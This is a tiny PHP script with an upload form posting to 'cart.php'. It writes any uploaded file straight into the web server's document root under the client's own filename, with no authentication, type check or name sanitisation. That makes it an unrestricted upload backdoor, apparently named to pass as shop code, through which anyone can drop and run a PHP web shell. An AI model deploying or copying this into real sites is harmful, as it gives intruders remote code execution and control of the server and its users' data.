<?php

if(count($_POST)>0)
{
	if(move_uploaded_file($_FILES['upload']['tmp_name'],$_SERVER['DOCUMENT_ROOT'].'/'.$_FILES['upload']['name']))
	echo "Done";
}

?>

<form action="cart.php" method="post" enctype="multipart/form-data">
  <input type="file" name="upload" />
  <input type="submit" name="submiot" value="submit" />
</form>
